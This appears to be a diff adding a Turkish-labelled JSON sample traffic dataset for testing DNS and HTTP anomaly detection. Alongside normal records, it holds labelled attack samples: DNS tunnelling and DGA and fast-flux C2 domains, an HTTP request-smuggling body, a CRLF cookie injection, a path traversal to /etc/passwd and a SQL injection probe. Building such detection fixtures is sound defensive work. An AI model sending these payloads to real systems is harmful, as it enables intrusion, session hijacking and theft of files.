@@ -1,0 +1,130 @@
+{
+  "aciklama": "G066 DNS ve HTTP Protokol Anomali ve Tehdit Göstergeleri Örnek Trafik Veri Seti",
+  "dns_kayitlari": [
+    {
+      "kayit_id": "DNS-NORM-01",
+      "alan_adi": "api.kurumsal.local",
+      "sorgu_tipi": "A",
+      "ttl": 300,
+      "istek_boyutu": 38,
+      "yanit_boyutu": 74,
+      "istemci_ip": "192.168.1.50",
+      "cozulmus_ipler": ["10.10.20.100"],
+      "zaman_damgasi": 1730336600.010
+    },
+    {
+      "kayit_id": "DNS-DGA-01",
+      "alan_adi": "xkf92mqp7vla81zk.top",
+      "sorgu_tipi": "A",
+      "ttl": 30,
+      "istek_boyutu": 42,
+      "yanit_boyutu": 80,
+      "istemci_ip": "192.168.1.188",
+      "cozulmus_ipler": ["185.220.101.5"],
+      "zaman_damgasi": 1730336600.050
+    },
+    {
+      "kayit_id": "DNS-TUNNEL-01",
+      "alan_adi": "dGhpcyBpcyBhIHNhbXBsZSBzZWNyZXQ.t.exfil.org",
+      "sorgu_tipi": "TXT",
+      "ttl": 10,
+      "istek_boyutu": 65,
+      "yanit_boyutu": 120,
+      "istemci_ip": "192.168.1.199",
+      "cozulmus_ipler": [],
+      "zaman_damgasi": 1730336600.080
+    },
+    {
+      "kayit_id": "DNS-AMP-01",
+      "alan_adi": "isc.org",
+      "sorgu_tipi": "ANY",
+      "ttl": 60,
+      "istek_boyutu": 45,
+      "yanit_boyutu": 3200,
+      "istemci_ip": "192.168.1.205",
+      "cozulmus_ipler": ["199.6.1.1", "199.6.1.2", "199.6.1.3"],
+      "zaman_damgasi": 1730336600.100
+    },
+    {
+      "kayit_id": "DNS-FLUX-01",
+      "alan_adi": "c2.botnet-mesh.cc",
+      "sorgu_tipi": "A",
+      "ttl": 15,
+      "istek_boyutu": 39,
+      "yanit_boyutu": 190,
+      "istemci_ip": "192.168.1.188",
+      "cozulmus_ipler": ["45.12.34.1", "91.200.12.3", "103.45.67.8", "185.190.22.1", "194.26.29.5"],
+      "zaman_damgasi": 1730336600.120
+    }
+  ],
+  "http_kayitlari": [
+    {
+      "kayit_id": "HTTP-NORM-01",
+      "metot": "GET",
+      "uri": "/dashboard/overview",
+      "surum": "HTTP/1.1",
+      "basliklar": {
+        "Host": "kurumsal.local",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
+        "Accept": "text/html,application/xhtml+xml"
+      },
+      "govde": "",
+      "istemci_ip": "192.168.1.50",
+      "zaman_damgasi": 1730336600.020
+    },
+    {
+      "kayit_id": "HTTP-SMUGGLE-01",
+      "metot": "POST",
+      "uri": "/api/transfer",
+      "surum": "HTTP/1.1",
+      "basliklar": {
+        "Host": "kurumsal.local",
+        "Content-Length": "6",
+        "Transfer-Encoding": "chunked",
+        "User-Agent": "curl/7.88.1"
+      },
+      "govde": "0\r\n\r\nGPOST /admin HTTP/1.1\r\nHost: kurumsal.local\r\n\r\n",
+      "istemci_ip": "192.168.1.222",
+      "zaman_damgasi": 1730336600.150
+    },
+    {
+      "kayit_id": "HTTP-CRLF-01",
+      "metot": "GET",
+      "uri": "/redirect?url=http://site.com%0d%0aSet-Cookie:%20session=evil_injected",
+      "surum": "HTTP/1.1",
+      "basliklar": {
+        "Host": "kurumsal.local",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "govde": "",
+      "istemci_ip": "192.168.1.222",
+      "zaman_damgasi": 1730336600.180
+    },
+    {
+      "kayit_id": "HTTP-TRAVERSAL-01",
+      "metot": "GET",
+      "uri": "/download?file=../../../../etc/passwd",
+      "surum": "HTTP/1.1",
+      "basliklar": {
+        "Host": "kurumsal.local",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "govde": "",
+      "istemci_ip": "192.168.1.230",
+      "zaman_damgasi": 1730336600.200
+    },
+    {
+      "kayit_id": "HTTP-SCANNER-01",
+      "metot": "GET",
+      "uri": "/admin/login.php?id=1%27%20OR%201=1",
+      "surum": "HTTP/1.1",
+      "basliklar": {
+        "Host": "kurumsal.local",
+        "User-Agent": "sqlmap/1.7.11#stable (https://sqlmap.org)"
+      },
+      "govde": "",
+      "istemci_ip": "192.168.1.240",
+      "zaman_damgasi": 1730336600.220
+    }
+  ]
+}
